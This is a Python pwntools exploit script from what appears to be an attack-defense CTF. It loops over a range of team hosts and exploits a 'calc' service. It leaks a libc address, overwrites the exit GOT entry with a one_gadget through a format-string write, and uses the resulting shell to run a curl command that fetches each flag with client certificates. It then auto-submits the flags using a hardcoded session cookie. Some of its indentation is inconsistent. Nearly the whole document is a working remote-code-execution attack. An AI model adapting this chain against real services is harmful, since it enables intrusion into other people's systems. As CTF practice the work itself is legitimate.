from pwn import *
import sys
import json
from requests import post

cookie = "shiro.session=3e09c2e7-7b93-429b-b076-61eab210e509"
url = "http://192.168.126.20:8080/awd/attackAndDefChange"

def submit(flag):
	print post(url, headers={"Cookie": cookie}, data={"questAnswer" : flag, "matchId" : 1}).text

def calcu(buf,conti = True):
	p.sendlineafter("Your input:\n",buf)

def conti(conti = True):
	if conti:
		p.sendafter("Y:N\n","Y")
	else:
		p.sendafter("Y:N\n","N")
	
def debugf():
	gdb.attach(p,"b *0x400920\nb printf")

def sendpayload(p1,write_addr):
	base = 0x6020c0
	target = 0x6021c0
	number = (target-base)/8
	payload = "-" * number
	res = 0
	while p1[:8] != "":
		par1 = u64(p1[:8].ljust(8,"\x00"))
		payload += str(par1) + "+"
		res += par1
		p1 = p1[8:]
	payload += str(write_addr - res)
	calcu(payload)

def change_exit():
	one_gadget = libc.address + 0xf1147
	log.success("one_gadget:"+hex(one_gadget))
	exit_got = elf.got["exit"]
	#debugf()
	for i in range(8):
		number = (one_gadget >> (i*8)) & 0xff
		if number == 0:
			payload = "%1$hhn"
		else:
			payload = "%{number}c%1$hhn".format(number=number)
		#payload = "%1c%1$n"
		sendpayload(payload,exit_got+i)
		if i != 7:
			conti()
		else:
			conti(False)

f = []

for i in range(12, 39):
    try:
        if i == 22:
		continue
	ip = "172.16.%d.11" % i
	p = remote(ip, 10000, timeout=5)
	libc = ELF("./libc.so.6")
	elf = ELF("./calc")
	context.log_level = "info"
	#context.terminal = ["tmux","splitw","-v"]
	base = 0x6020c0
	target = 0x6021c0
	number = (target-base)/8
	p1 = u64("%s".ljust(8,"\x00")) 
	payload = "-"*number + str(p1) + "+" + str(elf.got["puts"]-p1)
	calcu(payload)
	#print p.recv(6)
	puts_addr = u64(p.recvuntil("continue")[:6].ljust(8,"\x00"))
	libc.address = puts_addr - libc.symbols["puts"]
	log.success("libc_base:"+hex(libc.address))
	conti()
	change_exit()
	p.sendline("curl --cert /home/pwn1/pwn/client.crt --cacert /home/pwn1/pwn/ca.crt --key /home/pwn1/pwn/client.key  https://FlagServer.com:9000/flag")
	flag = p.recvline()
	j = json.loads(flag)
	submit(j["flag"])
	flag = j["flag"] + "\n" 
	print flag
	f.append(flag)
	p.close()
    except:
        continue
	
open("./flag.txt","w+").writelines(f)
